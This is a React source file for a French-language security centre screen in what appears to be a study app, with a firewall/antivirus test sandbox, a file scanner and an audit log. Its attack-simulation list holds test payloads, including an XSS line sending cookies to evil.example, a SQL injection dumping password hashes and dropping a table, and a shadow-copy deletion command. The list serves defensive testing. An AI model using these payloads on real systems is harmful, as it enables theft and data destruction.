import React, { useMemo, useState } from 'react';
import {
  Activity,
  AlertOctagon,
  Bug,
  CheckCircle2,
  FileSearch,
  Flame,
  KeyRound,
  Lock,
  RefreshCw,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Trash2,
  Upload,
} from 'lucide-react';
import { useApp } from '../context/AppContext';
import {
  createInitialSecurityState,
  FileScanResult,
  scanUploadedFile,
  SECURITY_SYSTEMS_CATALOG,
  SecuritySystemItem,
} from '../lib/securityFirewall';
import { SecuritySeverity } from '../types';

const LAYERS: ('Toutes' | SecuritySystemItem['layer'])[] = [
  'Toutes',
  'Pare-feu WAF',
  'Antivirus & Anti-Malware',
  'Réseau & En-têtes HTTP',
  'Service Worker PWA',
  'Cryptographie & Stockage',
  'Cloud Zero-Trust & Auth',
];

const ATTACK_SIMULATIONS = [
  {
    id: 'eicar',
    label: 'Test Virus EICAR',
    source: 'Bac à sable Antivirus (EICAR)',
    payload: 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
  },
  {
    id: 'xss',
    label: 'Attaque XSS <script>',
    source: 'Bac à sable WAF (XSS)',
    payload: '<script>fetch("https://evil.example/?c="+document.cookie)</script>',
  },
  {
    id: 'sqli',
    label: 'Injection SQL (SQLi)',
    source: 'Bac à sable WAF (SQLi)',
    payload: "' UNION SELECT email, password_hash FROM user_profiles; DROP TABLE study_sessions;--",
  },
  {
    id: 'ransom',
    label: 'Ransomware / Dropper',
    source: 'Bac à sable Antivirus (Ransomware)',
    payload: 'vssadmin delete shadows /all /quiet && eval(atob("YWxlcnQoMSk="))',
  },
  {
    id: 'rlo',
    label: 'Spoofing RLO .exe',
    source: 'Bac à sable Heuristique (RLO)',
    payload: 'annale_bac_2026_\u202Efdp.exe',
  },
];

function severityBadge(sev: SecuritySeverity): string {
  switch (sev) {
    case 'critical':
      return 'bg-red-100 text-red-800 dark:bg-red-900/40 dark:text-red-300';
    case 'high':
      return 'bg-orange-100 text-orange-800 dark:bg-orange-900/40 dark:text-orange-300';
    case 'medium':
      return 'bg-amber-100 text-amber-800 dark:bg-amber-900/40 dark:text-amber-300';
    case 'low':
      return 'bg-sky-100 text-sky-800 dark:bg-sky-900/40 dark:text-sky-300';
    default:
      return 'bg-emerald-100 text-emerald-800 dark:bg-emerald-900/40 dark:text-emerald-300';
  }
}

export const SecurityCenterScreen: React.FC = () => {
  const {
    state,
    updateSecurityConfig,
    updatePrivacy,
    runSecurityScan,
    testSecurityInput,
    logSecurityEvent,
    clearSecurityLogs,
    triggerPanicLockdown,
    notify,
  } = useApp();

  const sec = state.security ?? createInitialSecurityState();
  const cfg = sec.config;

  const [selectedLayer, setSelectedLayer] = useState<'Toutes' | SecuritySystemItem['layer']>('Toutes');
  const [customTestText, setCustomTestText] = useState('');
  const [lastTestOutcome, setLastTestOutcome] = useState<{ safe: boolean; message: string } | null>(null);
  const [fileScanResult, setFileScanResult] = useState<FileScanResult | null>(null);
  const [scanningFile, setScanningFile] = useState(false);

  const activeSystemsCount = useMemo(
    () => SECURITY_SYSTEMS_CATALOG.filter((sys) => sys.isActive(state)).length,
    [state]
  );

  const protectionScore = useMemo(() => {
    const ratio = activeSystemsCount / SECURITY_SYSTEMS_CATALOG.length;
    let score = Math.round(ratio * 100);
    if (sec.integrityStatus === 'tampered') score = Math.max(25, score - 25);
    return score;
  }, [activeSystemsCount, sec.integrityStatus]);

  const filteredSystems = useMemo(
    () =>
      selectedLayer === 'Toutes'
        ? SECURITY_SYSTEMS_CATALOG
        : SECURITY_SYSTEMS_CATALOG.filter((sys) => sys.layer === selectedLayer),
    [selectedLayer]
  );

  const handleRunSimulation = (sim: (typeof ATTACK_SIMULATIONS)[number]) => {
    const res = testSecurityInput(sim.source, sim.payload);
    setLastTestOutcome(res);
  };

  const handleCustomTest = (e: React.FormEvent) => {
    e.preventDefault();
    if (!customTestText.trim()) return;
    const res = testSecurityInput('Test manuel Pare-feu / Antivirus', customTestText);
    setLastTestOutcome(res);
  };

  const handleFileScan = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setScanningFile(true);
    try {
      const res = await scanUploadedFile(file, cfg);
      setFileScanResult(res);
      if (!res.safe) {
        logSecurityEvent({
          id: `sec-file-${Date.now()}`,
          timestamp: new Date().toISOString(),
          category: 'ANTIVIRUS_FILE',
          severity: 'critical',
          source: `Scanner Fichier (${res.fileName})`,
          ruleId: res.threats[0]?.ruleId ?? 'AV-FILE-BLOCK',
          description: res.threats.map((t) => t.description).join(' | '),
          blocked: true,
        });
        notify(`🛡️ Antivirus : menace détectée dans « ${res.fileName} » !`, 'error');
      } else {
        notify(`✅ Fichier « ${res.fileName} » analysé : aucune menace détectée.`, 'success');
      }
    } finally {
      setScanningFile(false);
      e.target.value = '';
    }
  };

  return (
    <div className="mx-auto max-w-6xl space-y-6">
      {/* Hero Banner */}
      <section className="rounded-2xl bg-gradient-to-br from-slate-900 via-blue-950 to-emerald-950 p-6 text-white shadow-lg">
        <div className="flex flex-col gap-5 lg:flex-row lg:items-center lg:justify-between">
          <div className="space-y-2">
            <div className="inline-flex items-center gap-2 rounded-full bg-emerald-500/20 px-3 py-1 text-xs font-bold text-emerald-300 ring-1 ring-emerald-400/40">
              <ShieldCheck className="h-4 w-4" />
              Bouclier Actif — Défense en Profondeur ({activeSystemsCount}/{SECURITY_SYSTEMS_CATALOG.length} systèmes)
            </div>
            <h1 className="text-2xl font-extrabold sm:text-3xl">
              Centre de Sécurité, Pare-feu WAF & Antivirus
            </h1>
            <p className="max-w-2xl text-sm text-slate-300">
              Protection multicouche 100 % opérationnelle hors ligne et Cloud Zero-Trust contre le piratage
              (XSS, SQLi, Bruteforce, RCE, Cache Poisoning) et les logiciels malveillants (virus, ransomwares,
              mineurs, droppers et fichiers exécutables piégés).
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-3">
            <div className="rounded-2xl bg-white/10 px-5 py-3 text-center backdrop-blur">
              <p className="text-3xl font-black text-emerald-300">{protectionScore}/100</p>
              <p className="text-[11px] font-semibold uppercase tracking-wide text-slate-300">
                Score Bouclier
              </p>
            </div>
            <div className="flex flex-col gap-2">
              <button
                onClick={() => runSecurityScan()}
                className="inline-flex items-center justify-center gap-2 rounded-xl bg-emerald-500 px-4 py-2.5 text-xs font-bold text-slate-950 shadow transition hover:bg-emerald-400"
              >
                <RefreshCw className="h-4 w-4" />
                Lancer Scan Antivirus Complet
              </button>
              <button
                onClick={triggerPanicLockdown}
                className="inline-flex items-center justify-center gap-2 rounded-xl bg-red-600/90 px-4 py-2 text-xs font-bold text-white transition hover:bg-red-500"
              >
                <AlertOctagon className="h-4 w-4" />
                Verrouillage d’Urgence
              </button>
            </div>
          </div>
        </div>

        {/* Live Telemetry Cards */}
        <div className="mt-5 grid gap-3 sm:grid-cols-2 lg:grid-cols-4">
          <div className="rounded-xl bg-white/10 p-3.5">
            <p className="text-[11px] font-semibold uppercase text-slate-300">Systèmes actifs</p>
            <p className="mt-1 text-xl font-extrabold text-white">
              {activeSystemsCount} / {SECURITY_SYSTEMS_CATALOG.length}
            </p>
            <p className="text-[11px] text-emerald-300">6 couches de défense</p>
          </div>
          <div className="rounded-xl bg-white/10 p-3.5">
            <p className="text-[11px] font-semibold uppercase text-slate-300">Menaces bloquées</p>
            <p className="mt-1 text-xl font-extrabold text-amber-300">{sec.blockedCount}</p>
            <p className="text-[11px] text-slate-300">{sec.quarantinedCount} mise(s) en quarantaine</p>
          </div>
          <div className="rounded-xl bg-white/10 p-3.5">
            <p className="text-[11px] font-semibold uppercase text-slate-300">Intégrité IndexedDB</p>
            <p className="mt-1 text-xl font-extrabold text-emerald-300">
              {sec.integrityStatus === 'tampered' ? 'Alerte' : 'Scellée SHA-256'}
            </p>
            <p className="text-[11px] text-slate-300">
              AES-256 : {state.privacy.localEncryptionEnabled ? 'Actif' : 'Désactivé'}
            </p>
          </div>
          <div className="rounded-xl bg-white/10 p-3.5">
            <p className="text-[11px] font-semibold uppercase text-slate-300">Dernier scan complet</p>
            <p className="mt-1 text-sm font-bold text-white">
              {sec.lastScan
                ? `${sec.lastScan.itemsScanned} éléments (${sec.lastScan.threatsFound} alerte)`
                : 'Prêt à analyser'}
            </p>
            <p className="text-[11px] text-slate-300">
              {sec.lastScan
                ? new Date(sec.lastScan.scannedAt).toLocaleTimeString('fr-FR')
                : 'Protection temps réel active'}
            </p>
          </div>
        </div>
      </section>

      {/* Interactive Firewall & Antivirus Sandbox + File Scanner */}
      <div className="grid gap-6 lg:grid-cols-2">
        <section className="hc-card space-y-4 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-slate-800 dark:bg-slate-900">
          <div className="flex items-center justify-between">
            <h2 className="flex items-center gap-2 text-base font-bold text-slate-900 dark:text-white">
              <Flame className="h-5 w-5 text-orange-600" />
              Bac à sable : Tester le Pare-feu & l’Antivirus
            </h2>
            <span className="rounded-full bg-orange-100 px-2.5 py-0.5 text-[11px] font-bold text-orange-800 dark:bg-orange-900/40 dark:text-orange-300">
              100 % inoffensif
            </span>
          </div>
          <p className="text-xs text-slate-600 dark:text-slate-400">
            Clique sur une simulation d’attaque ou saisis un texte suspect pour vérifier en direct le blocage
            WAF, la détection virale EICAR/Ransomware et la journalisation SIEM :
          </p>

          <div className="flex flex-wrap gap-2">
            {ATTACK_SIMULATIONS.map((sim) => (
              <button
                key={sim.id}
                onClick={() => handleRunSimulation(sim)}
                className="inline-flex items-center gap-1.5 rounded-lg border border-red-200 bg-red-50 px-3 py-1.5 text-xs font-bold text-red-700 transition hover:bg-red-100 dark:border-red-900/50 dark:bg-red-950/30 dark:text-red-300"
              >
                <Bug className="h-3.5 w-3.5" />
                {sim.label}
              </button>
            ))}
          </div>

          <form onSubmit={handleCustomTest} className="flex gap-2">
            <input
              type="text"
              value={customTestText}
              onChange={(e) => setCustomTestText(e.target.value)}
              placeholder="Colle un texte, lien ou script suspect à inspecter..."
              className="flex-1 rounded-xl border border-slate-300 bg-slate-50 px-3 py-2 text-xs text-slate-900 focus:border-blue-600 focus:outline-none dark:border-slate-700 dark:bg-slate-950 dark:text-white"
            />
            <button
              type="submit"
              className="rounded-xl bg-blue-700 px-4 py-2 text-xs font-bold text-white hover:bg-blue-800"
            >
              Inspecter
            </button>
          </form>

          {lastTestOutcome && (
            <div
              className={`rounded-xl border p-3 text-xs font-semibold ${
                lastTestOutcome.safe
                  ? 'border-emerald-200 bg-emerald-50 text-emerald-800 dark:border-emerald-900/40 dark:bg-emerald-950/30 dark:text-emerald-300'
                  : 'border-red-200 bg-red-50 text-red-800 dark:border-red-900/40 dark:bg-red-950/30 dark:text-red-300'
              }`}
            >
              {lastTestOutcome.safe ? '✅ ' : '🛡️ '}
              {lastTestOutcome.message}
            </div>
          )}
        </section>

        {/* Local File Antivirus Scanner */}
        <section className="hc-card space-y-4 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-slate-800 dark:bg-slate-900">
          <h2 className="flex items-center gap-2 text-base font-bold text-slate-900 dark:text-white">
            <FileSearch className="h-5 w-5 text-emerald-600" />
            Scanner Antivirus de Fichiers (Magic Bytes & SHA-256)
          </h2>
          <p className="text-xs text-slate-600 dark:text-slate-400">
            Analyse un fichier local 100 % hors ligne avant ouverture : détection des exécutables déguisés
            (Windows PE/MZ, Linux ELF, Mach-O), doubles extensions, caractères RLO, signatures EICAR et
            calcul de l’empreinte SHA-256.
          </p>

          <label className="flex cursor-pointer flex-col items-center justify-center rounded-xl border-2 border-dashed border-slate-300 bg-slate-50 px-4 py-6 text-center transition hover:border-blue-500 hover:bg-blue-50/40 dark:border-slate-700 dark:bg-slate-950/60">
            <Upload className="h-7 w-7 text-blue-600" />
            <span className="mt-2 text-xs font-bold text-slate-800 dark:text-slate-200">
              {scanningFile
                ? 'Analyse binaire et cryptographique en cours...'
                : 'Sélectionner un fichier à scanner hors ligne (max 10 Mo)'}
            </span>
            <span className="mt-0.5 text-[11px] text-slate-500">
              Aucun fichier n’est envoyé sur Internet — analyse locale dans le navigateur
            </span>
            <input type="file" onChange={handleFileScan} className="hidden" />
          </label>

          {fileScanResult && (
            <div
              className={`space-y-2 rounded-xl border p-3.5 text-xs ${
                fileScanResult.safe
                  ? 'border-emerald-200 bg-emerald-50 dark:border-emerald-900/40 dark:bg-emerald-950/30'
                  : 'border-red-200 bg-red-50 dark:border-red-900/40 dark:bg-red-950/30'
              }`}
            >
              <div className="flex items-center justify-between font-bold">
                <span>
                  {fileScanResult.safe ? '✅ Fichier sain : ' : '🚨 Menace détectée : '}
                  {fileScanResult.fileName}
                </span>
                <span>{(fileScanResult.sizeBytes / 1024).toFixed(1)} Ko</span>
              </div>
              {fileScanResult.sha256 && (
                <p className="break-all font-mono text-[10px] text-slate-600 dark:text-slate-300">
                  SHA-256 : {fileScanResult.sha256}
                </p>
              )}
              {fileScanResult.threats.length > 0 && (
                <ul className="list-disc space-y-1 pl-4 text-red-700 dark:text-red-300">
                  {fileScanResult.threats.map((t, idx) => (
                    <li key={idx}>
                      <strong>[{t.ruleId}]</strong> {t.description}
                    </li>
                  ))}
                </ul>
              )}
            </div>
          )}
        </section>
      </div>

      {/* Active Shield Controls */}
      <section className="hc-card space-y-4 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-slate-800 dark:bg-slate-900">
        <h2 className="flex items-center gap-2 text-base font-bold text-slate-900 dark:text-white">
          <Lock className="h-5 w-5 text-blue-600" />
          Pilotage des Modules de Protection en Temps Réel
        </h2>
        <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
          {(
            [
              { key: 'firewallEnabled', label: 'Pare-feu WAF (XSS / SQLi / RCE)' },
              { key: 'antivirusEnabled', label: 'Moteur Antivirus & Signatures' },
              { key: 'strictMode', label: 'Mode Strict (Heuristique Entropie)' },
              { key: 'domGuardEnabled', label: 'Garde DOM Temps Réel (Anti-Injection)' },
              { key: 'rateLimitEnabled', label: 'Anti-Flood / Anti-DDoS Applicatif' },
              { key: 'bruteForceProtection', label: 'Anti-Bruteforce & Mots de Passe Forts' },
              { key: 'zeroTrustCloudValidation', label: 'Validation Cloud Zero-Trust Supabase' },
              { key: 'integrityCheckEnabled', label: 'Sceau d’Intégrité SHA-256 IndexedDB' },
            ] as const
          ).map((toggle) => (
            <label
              key={toggle.key}
              className="flex cursor-pointer items-center justify-between rounded-xl border border-slate-200 p-3 text-xs font-semibold dark:border-slate-700"
            >
              <span>{toggle.label}</span>
              <input
                type="checkbox"
                checked={cfg[toggle.key]}
                onChange={(e) => updateSecurityConfig({ [toggle.key]: e.target.checked })}
                className="h-4 w-4 accent-emerald-600"
              />
            </label>
          ))}

          <label className="flex cursor-pointer items-center justify-between rounded-xl border border-slate-200 p-3 text-xs font-semibold dark:border-slate-700">
            <span className="flex items-center gap-1.5">
              <KeyRound className="h-4 w-4 text-emerald-600" />
              Chiffrement Coffre AES-256-GCM
            </span>
            <input
              type="checkbox"
              checked={state.privacy.localEncryptionEnabled}
              onChange={(e) => updatePrivacy({ localEncryptionEnabled: e.target.checked })}
              className="h-4 w-4 accent-emerald-600"
            />
          </label>
        </div>

        <div className="flex flex-wrap items-center gap-3 pt-1 text-xs">
          <span className="font-bold text-slate-700 dark:text-slate-300">
            Verrouillage automatique d’inactivité :
          </span>
          {[0, 10, 15, 30, 60].map((mins) => (
            <button
              key={mins}
              onClick={() => updateSecurityConfig({ autoLockMinutes: mins })}
              className={`rounded-lg px-3 py-1 font-bold transition ${
                cfg.autoLockMinutes === mins
                  ? 'bg-blue-700 text-white'
                  : 'bg-slate-100 text-slate-700 hover:bg-slate-200 dark:bg-slate-800 dark:text-slate-300'
              }`}
            >
              {mins === 0 ? 'Désactivé' : `${mins} min`}
            </button>
          ))}
        </div>
      </section>

      {/* Complete Catalog of 36 Active Security Systems */}
      <section className="hc-card space-y-4 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-slate-800 dark:bg-slate-900">
        <div className="flex flex-wrap items-center justify-between gap-3">
          <h2 className="flex items-center gap-2 text-base font-bold text-slate-900 dark:text-white">
            <Shield className="h-5 w-5 text-emerald-600" />
            Architecture complète : {SECURITY_SYSTEMS_CATALOG.length} Systèmes de Sécurité Actifs
          </h2>
          <div className="flex flex-wrap gap-1.5">
            {LAYERS.map((layer) => (
              <button
                key={layer}
                onClick={() => setSelectedLayer(layer)}
                className={`rounded-lg px-2.5 py-1 text-[11px] font-bold transition ${
                  selectedLayer === layer
                    ? 'bg-slate-900 text-white dark:bg-blue-600'
                    : 'bg-slate-100 text-slate-600 hover:bg-slate-200 dark:bg-slate-800 dark:text-slate-300'
                }`}
              >
                {layer}
              </button>
            ))}
          </div>
        </div>

        <div className="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
          {filteredSystems.map((sys) => {
            const active = sys.isActive(state);
            return (
              <div
                key={sys.id}
                className={`rounded-xl border p-3.5 transition ${
                  active
                    ? 'border-emerald-200/80 bg-emerald-50/40 dark:border-emerald-900/40 dark:bg-emerald-950/15'
                    : 'border-slate-200 bg-slate-50 opacity-75 dark:border-slate-800 dark:bg-slate-950/40'
                }`}
              >
                <div className="flex items-center justify-between gap-2">
                  <span className="rounded bg-slate-900 px-1.5 py-0.5 font-mono text-[10px] font-bold text-white dark:bg-slate-700">
                    {sys.code}
                  </span>
                  <span
                    className={`inline-flex items-center gap-1 text-[11px] font-bold ${
                      active ? 'text-emerald-700 dark:text-emerald-400' : 'text-slate-500'
                    }`}
                  >
                    {active ? (
                      <>
                        <CheckCircle2 className="h-3.5 w-3.5" /> Actif
                      </>
                    ) : (
                      <>
                        <ShieldAlert className="h-3.5 w-3.5" /> Pause
                      </>
                    )}
                  </span>
                </div>
                <p className="mt-2 text-xs font-bold text-slate-900 dark:text-white">{sys.name}</p>
                <p className="mt-1 text-[11px] leading-relaxed text-slate-600 dark:text-slate-400">
                  {sys.description}
                </p>
                <p className="mt-2 text-[10px] font-semibold uppercase tracking-wide text-slate-400">
                  {sys.layer}
                </p>
              </div>
            );
          })}
        </div>
      </section>

      {/* SIEM Security Event Audit Log */}
      <section className="hc-card space-y-4 rounded-2xl border border-slate-200 bg-white p-5 shadow-sm dark:border-slate-800 dark:bg-slate-900">
        <div className="flex items-center justify-between">
          <h2 className="flex items-center gap-2 text-base font-bold text-slate-900 dark:text-white">
            <Terminal className="h-5 w-5 text-purple-600" />
            Journal d’Audit SIEM & Quarantaine ({sec.events.length} événement(s))
          </h2>
          <button
            onClick={clearSecurityLogs}
            className="inline-flex items-center gap-1.5 rounded-lg border border-slate-200 px-3 py-1.5 text-xs font-bold text-slate-600 hover:bg-slate-100 dark:border-slate-700 dark:text-slate-300 dark:hover:bg-slate-800"
          >
            <Trash2 className="h-3.5 w-3.5" />
            Vider le journal
          </button>
        </div>

        <div className="max-h-80 space-y-2 overflow-y-auto pr-1">
          {sec.events.map((ev) => (
            <div
              key={ev.id}
              className="flex flex-col gap-1 rounded-xl border border-slate-200 bg-slate-50/70 p-3 text-xs dark:border-slate-800 dark:bg-slate-950/60 sm:flex-row sm:items-center sm:justify-between"
            >
              <div className="space-y-0.5">
                <div className="flex flex-wrap items-center gap-2">
                  <span className={`rounded px-1.5 py-0.5 text-[10px] font-bold uppercase ${severityBadge(ev.severity)}`}>
                    {ev.severity}
                  </span>
                  <span className="font-mono text-[10px] font-bold text-slate-500">{ev.ruleId}</span>
                  <span className="font-bold text-slate-800 dark:text-slate-100">{ev.source}</span>
                  {ev.blocked && (
                    <span className="inline-flex items-center gap-0.5 rounded bg-red-600 px-1.5 py-0.5 text-[10px] font-bold text-white">
                      <Activity className="h-3 w-3" /> BLOQUÉ
                    </span>
                  )}
                </div>
                <p className="text-slate-600 dark:text-slate-300">{ev.description}</p>
                {ev.sampleSnippet && (
                  <p className="font-mono text-[10px] text-slate-400">
                    Extrait neutralisé : {ev.sampleSnippet}
                  </p>
                )}
              </div>
              <span className="shrink-0 font-mono text-[10px] text-slate-400">
                {new Date(ev.timestamp).toLocaleString('fr-FR')}
              </span>
            </div>
          ))}
        </div>
      </section>
    </div>
  );
};
